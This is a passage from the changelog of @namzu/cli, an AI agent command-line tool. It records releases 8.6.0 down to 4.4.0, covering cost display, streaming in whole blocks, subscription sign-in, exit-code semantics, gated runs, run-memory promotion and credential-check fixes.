  so the operator-facing surface kept making the claim the kernel had just
  stopped making.

  Two things were wrong with that line beyond the number. A run on local
  inference costs nothing and is not the same event as a run nobody can price,
  and both landed on the same sentence. And the sentence asserted something
  about the provider that no code had checked: what is known is that namzu has
  no rate for the model, which is a statement about this side of the wire and
  points at a different fix.

  `/cost` now distinguishes three states — a real cost, a measured zero, and not
  known — and marks a partly-priced run as a floor rather than an answer. The
  status bar shows `$?` rather than omitting the figure, because a missing cost
  on a line read at a glance is read as no cost.

  `patch`: no exported symbol changes. The internal `AgentEvent` usage variant
  carries the kernel's `CostInfo` whole instead of a flattened `costUsd`, but
  neither it nor the renderers are part of `@namzu/cli`'s public barrel — the
  package exports a CLI, and its behaviour is corrected, not extended.

## 8.6.0

### Minor Changes

- 1797bf1: A reply arrives in whole blocks instead of typing itself out.

  Token deltas used to be appended to the transcript the moment they arrived.
  Nothing animated them — there is no timer anywhere in the package — but a few
  characters at a time reads the same way, and an operator ends up watching a
  line grow rather than reading it.

  Deltas are now held and released a **block** at a time: a paragraph, a list, a
  fenced code block. A short answer has no blank line in it, so it is one block
  and appears whole, which is the common case. A long answer appears paragraph by
  paragraph, so the screen still shows that work is happening without spelling it
  out letter by letter.

  **A fenced code block is never split**, even though it contains blank lines.
  Cutting there would hand the renderer a fence that opens and never closes, and
  the first half of a snippet would render in a different style from the second.

  Nothing is lost. The tail of a reply is an incomplete block by construction, so
  every close path — normal completion, a tool call interrupting the text, an
  error mid-turn — flushes what is buffered before finalising. That is the one
  way this could have gone wrong quietly, and it is the failure the new tests are
  built around: they drive a rendered turn and assert the whole reply is on
  screen, exactly once, including a reply that never completes a block at all.

## 8.5.1

### Patch Changes

- Updated dependencies [a4bcbc9]
  - @namzu/anthropic@3.3.0
  - @namzu/sdk@22.0.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 8.5.0

### Minor Changes

- 3f87189: Makes the subscription sign-in reachable from the screen that needs it, and
  adds `namzu login` / `namzu logout`.

  **The bug this fixes.** The sign-in shipped as `/login`. Slash commands are
  typed into the composer, and the composer does not exist during the provider
  picker — so the one operator who most needs to sign in, the one with no
  credential at all whom namzu routes straight to the picker, was the one
  operator who could not reach it. There was no other route: nothing else writes
  the credential store. The screen listed the sources it scans, offered to take a
  pasted key, and told them to set an environment variable and restart, while a
  working sign-in sat behind a keystroke that did not exist.

  - **`l` at the picker** starts the sign-in. namzu opens your browser and picks
    the result up when the page finishes.
  - **`namzu login`** does the same from a bare shell, and also reads a pasted
    address from standard input — so a container or a remote machine with no
    browser can finish the sign-in. `--no-browser` skips the launcher,
    `--timeout <seconds>` bounds the wait. **`namzu logout`** removes the
    credential.
  - **The picker's source list now names `~/.namzu/credentials.json`**, which it
    scanned and did not mention.

  There is deliberately no `namzu login --code <value>`: the PKCE verifier lives
  in the process that started the sign-in, so a second invocation could not
  finish the first one's attempt. A flag that looks like it should work and
  cannot is worse than its absence, so the paste is read by the waiting process
  instead.

  Two message defects found by running it rather than reading it: a bare Enter at
  the prompt spent the whole attempt on an empty paste, and a failed sign-in in a
  terminal told you to "run /login" — a slash command, in a shell.

## 8.4.0

### Minor Changes

- f84d2e3: `Ctrl+O` expands collapsed tool output in place again, for the rows still on
  screen.

  The last few transcript entries are now drawn live rather than printed once, so
  pressing `Ctrl+O` replaces the `… +6 lines` hint with the lines it was hiding —
  in the row where it already is, with nothing printed twice. Pressing it again
  closes them.

  How far back it reaches is bounded by your terminal's height, because the live
  region has to stay well inside the viewport. On a terminal roughly under thirty
  rows there is no room for one, and `Ctrl+O` says so and points at `/expand`
  rather than doing nothing. `/expand <n>` is unchanged and remains the way to
  reach anything older; it still appends the full body as a new entry.

  Nothing changes for a caller: no exported type, flag or route moved.

### Patch Changes

- 908cbf6: Parse a streaming reply one block at a time instead of re-parsing the whole
  message on every token.

  The pending transcript row re-renders per token, and each render re-parsed the
  entire message: a forty-block answer was parsed forty blocks deep on every
  token, so the cost of streaming a reply grew with the square of its length. Long
  replies now stream at a cost that tracks their length rather than its square.

  Nothing changes for a caller. `@namzu/cli` exports no markdown API; the new
  `scanBlocks` and `parseBlock` are internal to the terminal UI, and
  `parseMarkdown` is now the composition of the two with identical output.

## 8.3.0

### Minor Changes

- 2037c65: Sign in with a subscription instead of pasting an API key.

  `/login` runs an authorization-code sign-in with PKCE and stores the result in
  `~/.namzu/credentials.json`, on every platform. namzu refreshes it as it
  expires and finds it again on the next launch; `/logout` removes it. If you
  already use an environment variable or a typed key, nothing changes — this adds
  a door, it does not move one.

  **On a machine with no browser** the sign-in still works. namzu prints the
  address; open it wherever you have a browser and hand the result back with
  `/login <address-or-code>`. namzu tells you at the time whether the automatic
  hand-back is available on your machine, rather than leaving you waiting for one
  that is not.

  **The credential file is private, and namzu proves it rather than assuming it.**
  It is written owner-only and the protection is then read back — the mode on
  Linux and macOS, the access-control list on Windows, where a POSIX mode proves
  nothing. If that check cannot be made the file is deleted and the sign-in fails
  with a reason.

  **Whose OAuth client namzu presents is recorded in the source, next to the
  value** (`packages/cli/src/integrations/providers/identity.ts`). It is not
  namzu's own: the authorization server accepts no other client for plan-backed
  inference and the vendor operates no open registration, so the choice was
  between using it and not offering the capability. You sign in on the vendor's
  page against your own account; nothing is proxied through a namzu service.

  Nothing is added to a package's runtime dependencies, and no existing export
  changes shape. Two additions a consumer of `@namzu/cli`'s types may notice:
  `DetectionSource` gains a `'stored'` member, so an exhaustive `switch` over it
  needs an arm; and a discovered provider's `oauth` metadata gains an optional
  `origin`, which defaults to the previous behaviour when omitted.

## 8.2.0

### Minor Changes

- 2d3f1fb: A missing credential no longer strands you: enter one from inside namzu

  Launching with a provider saved in `~/.namzu/preferences.json` and no credential
  for it produced a screen you could do nothing on — a disabled composer, a hint
  that read `Ctrl+C ×2 to exit`, and a message advising you to pick another
  provider on the one screen that will not let you pick one.

  That launch now lands in the **picker**, with the reason printed on the picker
  itself, and you can:

  - press `k` to enter a credential for the saved provider and carry straight on
    into a session, without leaving the program or setting an environment
    variable — including when other providers are detected, which previously hid
    the entry key entirely;
  - or choose a different provider, or leave with `Esc` / `Ctrl+C`, both named on
    screen.

  Entering a credential for the saved provider keeps the rest of your saved chain,
  including a pinned model, rather than resetting you to the registry default.

  **The entry screen now accepts a subscription token as well as an API key.** It
  reads which kind you pasted, sends it on the wire accordingly, and says which it
  took. A pasted subscription token has no refresh data with it, so it lapses
  within hours and cannot be renewed — you are told that at the paste rather than
  discovering it as an authentication failure mid-turn. A credential is still held
  in memory for the session only and is never written to disk.

  Two smaller corrections ride along: a base64 credential ending in `=` padding is
  no longer rejected as a shell fragment, and a refusal that routes you to the
  picker is now drawn _on_ the picker (the transcript is not rendered during that
  phase, so those explanations were previously invisible until after you had
  already chosen).

  Headless runs (`namzu -p`, `run-stream`, `drain`) are unchanged: a missing
  credential still refuses, with the same exit code, and never silently moves your
  run onto a different provider. The refusal's advice now names `--provider`,
  which is the thing a scripted caller can actually do.

## 8.1.0

### Minor Changes

- f59a8b0: `--gate '<command>'` — a run that is not allowed to finish on a red build

  `reviewAnswer` shipped complete: consulted only when the model stops calling tools, never on the forced-final turn, bounded by a rejection budget, with its own terminal state `answer_rejected` so a stop is not mistaken for a token budget running out. **No shipped app supplied one**, so an operator could not use any of it without writing TypeScript.

  New in `@namzu/sdk`: `createCommandGate({ commands, cwd, maxRetries?, timeoutMs?, exec?, maxOutputChars?, fingerprint? }): ReviewAnswer`. It runs shell command lines in order, stops at the first failure, and hands the failure back as the next user turn naming the command, the attempt, the exit code and a head-and-tail clip of the output.

  New in `@namzu/cli`: a repeatable `--gate '<command>'` on `run` and `run-stream`, plus `--gate-retries <n>`. Repeating the flag appends rather than replaces — `--gate 'pnpm typecheck' --gate 'pnpm test'` means both, in that order.

  **The part that makes it a bounded loop rather than one that burns its budget.** Before re-running a command that already failed, the workspace is fingerprinted; if it is byte-for-byte identical to the snapshot taken when that command last failed, the command is **not run**. The attempt still advances and the model is told the workspace has not changed and must edit something before trying to finish — cheaper than a full test run, and a _different_ instruction from repeating a failure it has already been shown.

  Also new and exported: `fingerprintWorkspace({ cwd, exec, timeoutMs?, maxBytes?, fs? })`. It hashes `git status --porcelain`, `git diff --binary HEAD` and the contents of every untracked file, **recording a symlink as its target rather than reading through it** — a link repointed to a different file with identical bytes is a change, and following it would hash the two the same.

  It returns `null` — meaning _no fingerprint_ — for a non-zero git exit, a tree with no commits, a timeout, or output past the size cap, and a caller that cannot fingerprint re-runs its command. That direction is deliberate: a wrong `null` costs one execution, while a wrong match is a verification that silently did not happen.

  A run with no `--gate` is byte-identical to one from before this existed: the option is spread in only when gates were asked for.

- 1be00a7: A run now remembers what it worked out, instead of dropping it at settle

  `promoteMemory` is invoked once when a run settles, with the compaction extractor's already-structured output — decisions, discoveries, user requirements, failures, environment facts, with eviction counts carried rather than hidden. **No shipped app supplied the hook.** So that structure, which the compaction pass spent tokens producing, was serialized into one system message and dropped on the floor when the run ended; the only way into namzu's memory store was the model deciding to call `save_memory`.

  New in `@namzu/sdk`: `createMemoryPromoter({ store, tags?, maxPerCategory? }): PromoteMemory`, plus `RUN_MEMORY_TAG`. `@namzu/cli` supplies it over the very store its memory tools already use, so what a run learns is what `search_memory` finds on the next one.

  ## What changes for you without asking

  **This is on by default, and it applies to the interactive TUI as well as to `namzu run` and `namzu run-stream`.** The promoter is supplied from the session every surface is built on, so an ordinary chat session that works something out now leaves a markdown record under `<cwd>/.namzu/memory` when the run settles — a directory that previously only ever grew when the model chose to call `save_memory`. The next session's `search_memory` will find those records, which is the point, and it is also the part you will notice.

  It is not opt-in because the alternative it replaces is not neutral: a run's extracted knowledge was being discarded at settle, and a flag would mean the default stays the lossy one. What keeps it from being noisy is the filter below — a session that answered a question without deciding, discovering, failing at or being told anything durable writes nothing at all.

  An SDK embedder can replace or disable it by passing its own `promoteMemory` to `query` — a function that does nothing writes nothing. **The CLI has no flag for it in this release**, which is worth knowing before you upgrade if a written-to `.namzu/memory` is a problem for your setup; say so and it becomes one.

  **The filter is the whole decision, and it is strict.** A run that learned nothing leaves **no record at all** — not an empty one, not one whose body says "no decisions". Only the five knowledge categories count: user requirements, decisions, discoveries, failures, environment. Not `task`, which every run has because it is the prompt restated; not `files`, which every run that opened anything has and which says what was _touched_ rather than what was _learned_. The model reads this store on later runs, so a record per run is not merely wasted disk — it is context spent on runs that discovered nothing.

  Records are markdown, tagged `run-memory`, and carry the forming run's id in their metadata so a surprising memory can be checked against what actually happened. Eviction counts are rendered, because somebody reading the record should know they are reading a truncated account of the run.

  The promoter deliberately does **not** catch its own failures: the runtime already catches and logs a promoter throw at settle without touching the answer, and catching here as well would hide a broken store from the one place that reports it.

  It also does not deduplicate, merge with a previous run's record, or expire anything. Each is a policy with real trade-offs, and `promoteMemory` is a callback precisely so the runtime does not decide them — this is the obvious default, not the only possible one. Pass your own `PromoteMemory` to `query` to replace it.

  Sub-agents do not promote. A parent that delegated six times would otherwise leave seven accounts of one piece of work for the next run to read; the parent's settle speaks for the whole task.

### Patch Changes

- Updated dependencies [f59a8b0]
- Updated dependencies [1be00a7]
  - @namzu/sdk@21.1.0

## 8.0.0

### Major Changes

- 8975cce: `namzu doctor` no longer exits 0 when a check could not answer

  **What breaks.** `namzu doctor` gains a new exit code, `69`, and a new status
  word, `skipped`.

  - **A CI step running `namzu doctor` can now fail where it used to pass.** If a
    check times out, is aborted, or the thing it reads throws, the command exits
    `69` instead of `0`. Nothing is claimed to have failed — `1` still means that
    — but the report is incomplete, and it used to say so only in text nothing
    reads. If you need the old behaviour while you look into it, treat `69` as
    success explicitly rather than by accident.
  - **`DoctorStatus` gains `'skipped'`.** An exhaustive `switch` over it, or a
    `Record<DoctorStatus, …>`, stops compiling. Handle `skipped` as "there was
    nothing here to check" — an ordinary state of a healthy machine, not a
    problem.
  - **`DoctorReport['exit']` gains `69`**, and `DoctorReport['summary']` gains a
    required `skipped: number`. Code that constructs a `DoctorReport` by hand must
    add the field; code that reads the summary can now rely on the counts summing
    to `total`, which they did not while `skipped` was hidden inside
    `inconclusive`.

  **Why.** "Healthy" and "did not manage to look" shared an exit code in the one
  command whose entire job is to report state it read. Fixing that needed the
  status vocabulary split first, because `inconclusive` was carrying two facts:
  _there is nothing here to check_ — an optional package absent, a registry with
  no auto-discovery, nothing configured yet — and _this check did not answer_.
  Only the second is a gap worth an exit code; making both non-zero would have
  turned `namzu doctor` red on every healthy machine.

  So `vault.registered`, `providers.registered`, `providers.chain` with no
  preferences file, and `telemetry.installed` with the package absent now report
  `skipped`, and they still exit `0`.

  **Also fixed:** `telemetry.installed` reported `not installed (optional
package)` for _any_ import failure, so a package that was present and threw on
  load was reported as absent. Resolution and loading are now asked separately —
  cannot resolve is `skipped`, resolves but throws is `fail`, with the reason.

  **Why 69 and not 2.** `2` already means "no checks registered" here. `namzu
eval` spells the same idea `2`, which it can because it never spent that number
  on anything else; giving one number two meanings inside one command is worse
  than giving one meaning two numbers across two. `69` is sysexits
  `EX_UNAVAILABLE`.

- c3c8358: `run-stream`'s exit code now says whether you can do anything about the failure

  **What breaks.** Four conditions that exited `0` now exit `1`, and two flags
  that were accepted and ignored are now refused.

  | Condition                                                                                                                            | Was                                  | Is                                 |
  | ------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------ | ---------------------------------- |
  | `--session <id>` and the conversation cannot be opened                                                                               | `0`                                  | `1`                                |
  | No LLM provider available                                                                                                            | `0`                                  | `1`                                |
  | The session has no provider for an environment reason (no credential, a driver that would not load, a chain that contradicts itself) | `0`                                  | `1`                                |
  | A declared tool server is not available                                                                                              | `0`                                  | `1`                                |
  | A command file that will not parse                                                                                                   | `0`                                  | `1`                                |
  | `--continue` / `--resume`                                                                                                            | silently ignored, ran stateless, `0` | refused with an `error` event, `0` |

  Everything else is unchanged. An unknown option, a missing prompt, a `--cwd`
  that does not exist, a bad `--permission-mode`, an interactive command named
  headlessly and a provider id that is not a provider all still exit `0`; so does
  a run that started and failed; and an untrusted folder still exits `77`.

  **If you have a host that treats non-zero as "the folder is untrusted"**, that
  is the assumption to change: `77` still means only that, but `1` now means "a
  person has to fix something before this can work". If your host retried on `0`,
  it will stop looping on faults retrying could never fix — which is the point.

  **Why.** The documented rule was _started and failed → 0; refused to start →
  non-zero_, and applied to the real cases it did not sort them: an unknown
  option, a missing prompt, a bad `--cwd` and an unavailable tool server are all
  refusals to start, and all four exited `0` while an untrusted folder exited
  `77`. The retry argument the source appealed to does not sort them either —
  retrying an unknown option is as pointless as retrying an untrusted folder.

  The axis that does: **can the caller reach the run it asked for by changing what
  it sends?** Yes → `0`, and the host fixes its own invocation. No → non-zero,
  because a person has to act. Dropping `--session` is not "the caller fixing it";
  it abandons what was asked for.

  `1` rather than a new code because `namzu run` — the same one-shot, differing
  only in how it prints — already exits `1` for these conditions and `77` for
  trust. `77` stays scoped to trust, because being unambiguous is its whole
  justification.

  **Two branches had to be split before they could be sorted.** `hasProvider ===
false` covered both a provider id that is not a provider (yours to fix) and four
  environment failures; a refused command expansion covered both a bad invocation
  and a command file that will not parse. Each now carries the distinction as a
  field — `AgentSession.errorKind` and the `fixable` flag on a `refused`
  expansion — rather than leaving a caller to match on the message text, after
  which the message could never be reworded.

### Minor Changes

- 4df5cf1: `drainRuns` — the queue loop the cross-process claim shipped without

  `claimRun`, `releaseRun`, the fenced `writeCheckpoint`, `listDurableRuns({ claimed: false })` and `resumeRun({ claimFence })` were all already here, and nothing outside the store's own tests called any of them. The two things the claim was built for — an approval inbox and a crash sweeper — still needed every host to write the same loop, including the two parts a host writes wrong: the release that belongs in a `finally` so a FAILED run goes back on the queue too, and the `null` claim that means "somebody got there first" rather than an error.

  New: `drainRuns({ store, scope, holder, ttlMs, onRun, park?, signal?, maxConcurrent?, pageSize?, now? })`, plus the types `DrainRun`, `DrainRunsParams`, `DrainRunsResult`, `DrainFailure` and the constant `DEFAULT_DRAIN_PAGE_SIZE`. One bounded pass: list what nobody holds, claim it, hand it to your callback with its claim, release it. No timers, no processes, no `while (true)` — running it again is your scheduler's job.

  **Read this before relying on "exactly once".** Two drainers never hold one run at the same time; that is absolute. Exactly-once over a pass is weaker and comes from the FILTER, not the claim: a listing is a snapshot, so between paging a row and claiming it another drainer can finish that run and release it. A claimed row is therefore re-read against `park` before any work starts, and one that no longer matches comes back as `stale`. An inbox drain (`park: ['outstanding']`) whose work answers the park is exactly-once. **With no park filter there is nothing to re-check and two drainers can both process one run** — a checkpoint store holds no run status by design, so "already done" is a fact only your own run records carry, and a crash sweep intersects with them inside `onRun`.

  A store missing `listDurableRuns`, `claimRun` or `releaseRun` is refused with `capability_unavailable` **before anything is listed**, naming all three. It never degrades to "claimed by default", which would let every worker proceed on every run.

  `@namzu/cli` gains `namzu drain --store <dir> --tenant <id> --project <id> --session <id>`, which claims each unheld run under that scope and continues it from its last checkpoint under that claim's fence. It is one pass and then exit: `namzu serve` still answers that namzu has no daemon, and this command is the shape that refusal implies — something your scheduler runs, not a service namzu owns. A run parked on a human decision is reported, never resumed past. Additive on both packages; nothing existing changes behaviour.

### Patch Changes

- fce37b2: `/resume` now stops the turn it interrupts, and that turn is saved where it belongs

  Selecting a conversation from the `/resume` picker while the agent was working
  left the old turn running. Three things followed, and the last one outlived the
  process:

  - its tool rows and reply text kept appending into the resumed transcript, so
    one conversation's output arrived in the middle of another;
  - a follow-up you had queued for the old conversation was sent to the new one
    the moment the screen went idle;
  - when it finished, it wrote its messages into the **resumed** conversation's
    stored history. `namzu` then showed you a turn you never had there, and fed it
    to the model as context on the next one.

  Selecting a conversation now interrupts the running turn first, the same way
  `Esc` does. The interrupted turn is not discarded: it finishes reading its own
  events, its reply so far is written to the conversation it was started in, and
  the transcript says so — a tool call already dispatched is not undone, and the
  line says that too. Cancelling the picker still changes nothing, and a
  conversation that cannot be read now leaves the running turn alone rather than
  stopping it on the way to a failure.

  No API changed. If you script against `namzu`'s stored history, note that
  records written by this defect are already on disk and this release does not
  rewrite them.

- Updated dependencies [8975cce]
- Updated dependencies [4df5cf1]
- Updated dependencies [1582bdb]
- Updated dependencies [5dc8b82]
  - @namzu/sdk@21.0.0
  - @namzu/anthropic@3.2.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 7.0.0

### Major Changes

- 97e356a: **`run-stream --session <key>` no longer answers against a history you did not
  ask for, and no longer ends on a bare `done` when it failed to save the turn.**

  Two bare `catch` blocks at opposite ends of the same command, both of which
  produced an ordinary success.

  ## What breaks

  **A conversation that cannot be opened now stops the run.** Given `--session`,
  if the store cannot be reached — an unwritable `.namzu`, a corrupt map file —
  `run-stream` emits an `error` event and runs nothing. It used to fall through to
  the stateless path, which takes prior turns from **stdin**, so a caller who named
  a conversation got a turn composed against a different history, or none, and
  `exit 0`.

  _If you relied on that fallback:_ drop `--session`. That asks for the stateless
  run explicitly, which is the only way the command can tell the two apart.

  It is a refusal rather than a warning-and-continue because the command cannot say
  what was lost. A key is created on first use, so a fresh key legitimately has no
  prior turns — and the failure is precisely what stopped it finding out which case
  it was in. "Could not look" is not "there was nothing there."

  ## Also

  **A turn that could not be saved now says so**, as a `notice` on the event
  stream, naming the reason and the consequence: `history` for that session will
  not include the turn and the next turn will not have it as context. The run still
  succeeds and still exits 0 — the reply is complete and a host treating this as a
  failed turn would be wrong. It was previously swallowed, which made a later
  `namzu history` look broken with nothing connecting it to a write minutes
  earlier.

  `notice` is an existing event kind on this stream, already used for the config
  notices a few lines above the same handler.

### Patch Changes

- 1e347cd: **The permission prompt names `Ctrl+C`, and says why it is different from `n`.**

  `n` and `Esc` decline the tool call and the turn **continues** — the agent is
  told, and tries something else. `Ctrl+C` declines and **stops the turn**. Two
  different decisions, and the prompt listed only the first.

  So the only key that stops namzu was the one an operator could not see from the
  screen that governs it. Someone who wanted it to stop pressed `n`, watched it
  carry on with a different approach, and had nothing on that screen to tell them
  otherwise; the distinction existed only in the documentation.

  The prompt now lists all four keys, grouped by outcome, on two lines — at four
  keys a single line wraps mid-key on a narrow terminal, and this is the box you
  read while deciding. The status-bar hint keeps its compact three-key echo, which
  is budget-constrained by construction and shares a line with the working
  directory, the provider and the model.

  No behaviour changed. `Ctrl+C` has always done this.

## 6.0.2

### Patch Changes

- 4a6c86b: **`/tools` lists the tools the agent can call now, not the ones it could call
  when the session opened.**

  Some tools register during the first turn rather than at connect — the agent's
  own task tools are the ones that do it today. `/tools` was answering from a list
  captured before that happened, so those tools were missing from it for the whole
  session.

  The visible symptom was two commands disagreeing on one screen: `/permissions`
  reads the roster live and would name a tool as never-prompted that `/tools` did
  not list at all, which reads as namzu having invented a tool name.

  The connect line (`Connected to … · N tools`) is unchanged and still reports the
  count at connect time, because it describes a connection that has just happened.

## 6.0.1

### Patch Changes

- 7b60250: **`namzu doctor` now marks an unpinned model `(namzu default)` instead of
  `(default)`, and the picker's notices stop calling it the provider's.**

  A chain member that omits `model` gets a value out of namzu's own registry — a
  table compiled into the release. It is resolved at launch but never refreshed
  from the provider, so between releases it can name a model the provider has
  superseded.

  Every surface that showed that value called it "the default" or "its default",
  which reads as the provider's current one. It sends an operator who did not
  expect the model to go looking at the provider, where there is nothing to find.
  The thing to do is give that member an explicit `model`, and the surfaces now
  say so:

  - `namzu doctor`'s chain readout prints `<model> (namzu default)`.
  - The `/model` picker's four "could not list" notices say "showing namzu's pick
    for it" rather than "showing its default" — they sat beside a row already
    labelled `(namzu default)` and contradicted it.
  - `docs/cli/providers.md` no longer says an omitted `model` "tracks the default".
    It does not track anything; it moves when you upgrade namzu.

  If you parse `namzu doctor` output, the marker string changed.

## 6.0.0

### Major Changes

- 7be6884: **`/expand` reads a collapsed tool output in full. `Ctrl+O` is deprecated and
  stops expanding anything.**

  Tool diffs and command output collapse to six lines. The hint under them now
  names the command that reopens them — `… +6 lines · /expand 3` — and `/expand`
  with no argument takes the most recent one. The full text arrives as a new entry
  below, so the collapsed one stays where it was.

  ## What breaks

  **1. `Ctrl+O` no longer expands anything.** It is still bound: pressing it prints
  the reason and points at `/expand`, so nobody meets a dead key.

  Be clear about what it did, because it was not nothing. It was advertised as
  toggling full expansion for everything, and for output already on screen it was
  inert — finalized entries are printed once to the terminal's own scrollback and
  never redrawn, which is what keeps a long session bounded and native scrolling
  and selection working across the whole conversation. But pressing it _before_ a
  tool finished did have an effect: the result, when it arrived, printed in full.
  That behaviour is removed. It required deciding you wanted the output before you
  could see that it had been truncated, and nothing on screen ever mentioned it.

  _To keep the old behaviour:_ there is no flag for it. Run the tool, then
  `/expand`, which reaches output the key never could.

  **2. `expand` is now a reserved command name.** If you have a user-defined
  command at `~/.namzu/commands/expand.md` or `./.namzu/commands/expand.md`, the
  built-in takes the name and yours stops running — in the TUI and in `namzu run`
  / `run-stream` alike. Rename the file, and `/help` will report it as shadowed
  until you do.

  ## Also in this change

  - The collapse hint carries a number, and only bodies that actually truncate get
    one. A body short enough to print whole advertises nothing and takes no number.
  - The blank-row estimate that decides where the composer sits now counts the
    collapsed body under a tool call, the blank row between entries, and the width
    the body really renders at. It previously measured each entry by its first line
    alone, so a six-line tool result counted as nothing — in the direction that
    pushes the composer off the bottom of the screen.

## 5.0.2

### Patch Changes

- Updated dependencies [56c7d3a]
- Updated dependencies [ce51f5c]
  - @namzu/sdk@20.0.0
  - @namzu/anthropic@3.2.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 5.0.1

### Patch Changes

- e24e12a: Ctrl+V says what happened when there is no image to paste

  The status bar advertises `Ctrl+V to attach`. Pressing it read the clipboard,
  attached an image if it found one, and otherwise did nothing at all — no chip,
  no message, no error.

  So three quite different situations produced one identical silence: you have not
  copied an image; this machine has no clipboard tool installed; the key was never
  wired up. The operator's next move differs in each — copy an image, install a
  tool, or stop pressing the key — and the screen gave them nothing to choose
  with.

  Each outcome now says which it was, and a missing tool names what to install
  (`xclip` on X11, `wl-clipboard` on Wayland). The success path stays quiet,
  because the attachment chip is already the report.

  The reason had to be recovered before it could be shown: the clipboard reader
  returned a bare `null` for every failure, and on Linux a missing `xclip` and an
  empty clipboard are indistinguishable after the fact — both come back from the
  shell as a non-zero exit. It now checks whether any reader exists before
  attempting the read, and returns which of the two it found.

## 5.0.0

### Major Changes

- 190eeeb: The default model is current again, and says whose default it is

  **namzu's default Claude model changes from `claude-opus-4-7` to
  `claude-opus-5`** for the Anthropic provider, and from
  `anthropic/claude-opus-4-7` to `anthropic/claude-opus-5` for OpenRouter. Two
  generations had passed. Nothing errored — a run simply happened on an older
  model than the operator had any reason to expect, which is why it went unnoticed.

  **To keep the old model**, pick it in `/model`, or set it in
  `~/.namzu/preferences.json`:

  ```json
  {
    "version": 3,
    "providers": [{ "id": "anthropic", "model": "claude-opus-4-7" }]
  }
  ```

  A saved preference already wins over this constant, so anyone who has chosen a
  model is unaffected.

  **The picker now labels it `(namzu default)` rather than `(default)`.** It was
  described in the code as "the provider's own default", which it never was — this
  is a value namzu picks, it goes stale between provider releases, and an operator
  choosing from that list deserves to know it is a choice rather than an
  endorsement.

  Resolving the default at runtime was considered and rejected: it would buy a
  network call, a cache, and a staleness question on every launch, and the offline
  path is exactly where this defect would come back invisibly. The constant stays,
  with the obligation to re-check it at each provider release written where the
  constant is defined.

  The Bedrock default is **left unchanged and marked unverified.** That driver
  speaks the Converse API, whose ids are date-stamped
  (`<vendor>.<model>-<yyyymmdd>-v<n>:0`); the current value carries the version
  suffix but no date, so it fits neither that shape nor the newer bare alias.
  Nobody here has a credential to establish which the endpoint accepts, and a
  fabricated date would look authoritative while being a guess. That provider has
  no bundled driver in this build in any case, so the value is unreachable today.

### Patch Changes

- Updated dependencies [3c0df0c]
  - @namzu/sdk@19.0.0
  - @namzu/anthropic@3.2.0
  - @namzu/ollama@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/openrouter@2.1.0

## 4.5.0

### Minor Changes

- d3bd080: A wrong API key is no longer reported as working

  Typing a key into the picker ran a check that could not fail for two providers.
  Measured against deliberately invalid keys, both said the key was good.

  **With an OpenRouter key, any string at all passed.** A typo, the wrong
  clipboard entry, a revoked key — all were accepted and reported as verified. The
  check listed the model catalogue and treated a successful list as a passed
  check, and OpenRouter's catalogue endpoint does not authenticate, so it answered
  the same way whatever was sent. Nothing was wrong with that driver's listing; a
  catalogue was simply never evidence about a key.

  **With an Anthropic key, a real rejection was discarded.** The listing caught
  the `401` and returned a hardcoded three-model list, which the check read as
  success — so the truth existed, was thrown away, and was replaced by something
  that looked like an answer.

  A credential check is now a separate, declared capability. A driver that
  declares no probe is reported as **not checked**, never as verified, so a driver
  added in future cannot silently inherit a check it does not perform. Anthropic,
  OpenRouter, OpenAI and Ollama declare one; OpenRouter's asks about the key
  rather than the catalogue.

  Refusal and doubt stay distinct. A `401` means the key is genuinely refused; a
  timeout or a DNS failure means nothing was learned, and is reported that way —
  telling someone on a broken connection to rotate a working key is a different
  error, not a smaller one.

  **Anthropic's model listing also never once ran.** The SDK method was pulled out
  of its namespace and called bare, so it lost `this`, threw a `TypeError` on
  every call, and was swallowed by the same catch — the hardcoded models were not
  a fallback but the only answer the method could give. It now calls the live
  endpoint, and falls back only when that genuinely fails.

  The four driver packages are `minor` rather than `patch`: each gains a method
  it did not have, and added functionality is a minor whatever the size of the
  diff. Anthropic's earns it twice over, because its listing now returns the live
  catalogue where it previously returned the same three hardcoded entries to every
  caller - so the value every existing caller receives changes.

### Patch Changes

- Updated dependencies [d3bd080]
  - @namzu/sdk@18.1.0
  - @namzu/anthropic@3.2.0
  - @namzu/openrouter@2.1.0
  - @namzu/openai@1.2.0
  - @namzu/ollama@2.1.0

## 4.4.1

### Patch Changes

- 452a82a: **Credential discovery now states what it asks, and still lists only what it can
  use.**

  The `discoverProviders` header said it asks "three questions in order" and then
  listed two. The omitted one was the Keychain read — the question that takes a
  secret off the machine, so the one a reader most needs to see. It now lists
  three, in execution order (environment variable, Keychain, local probe), and
  states plainly that **the Keychain path is macOS-only**: on Windows and Linux
  there are exactly two doors, and a credential kept only in the OS credential
  store is not found. That is a gap rather than a nuance, and it is now written
  where someone reading the file will meet it.

  **A local provider whose server is not running is still not listed**, and the
  dead branch that proposed listing it is removed. Membership in the discovery
  list means "usable right now", and that is a contract two readers depend on: the
  `providers.chain` doctor check reads presence itself as the verdict for a
  provider that needs no key, and the session's chain builder applies no
  credential test to a local one. An entry for a down server would report it
  `reachable` and build it into the chain, failing on the day it was supposed to
  rescue a run. The operator-facing intent behind that branch already exists in
  the picker's empty state, which names both local servers and their ports and
  says to start one.

  No behaviour changes: the removed branch had an empty body, guarded by a
  condition (`!opts.skipProbes === false`) that did not mean what the comment
  above it said. Closes #258.

## 4.4.0

> **This version was never published.** `4.3.1` is followed on the registry by
> `4.4.1`; there is no `4.4.0` to install, and this section is kept rather than
> deleted because the work below did ship — inside `4.4.1`.
>
> What happened: the release PR that produced these version numbers had been
> computed before the changeset for `4.4.1` landed on `main`, so merging it
> bumped versions against a state that was already stale. The release workflow
> declined to publish and opened a fresh version PR instead, which is the
> correct behaviour and is why nothing was lost — but the bump had already been
> written, so this number was spent without ever reaching npm.
>
> The precondition that prevents it is now in the release skill: before merging
> a version PR, every changeset present on `main` must appear in that PR's diff.

### Minor Changes

- 3eed8a0: **A provider namzu cannot build is no longer offered as if it could.** Three
  registry entries advertised providers whose driver packages are not
  dependencies of the CLI. Two of them are genuinely discovered — one by a local
  probe, one by an ambient `AWS_ACCESS_KEY_ID` — so the picker listed them,
  choosing one saved it, and the next session refused it on a screen with a
  disabled composer where the advice "pick another" cannot be followed.

  `ProviderRegistryEntry` gains **`constructible`**: whether this build of the
  CLI bundles a driver for the entry. It is a statement about the CLI's
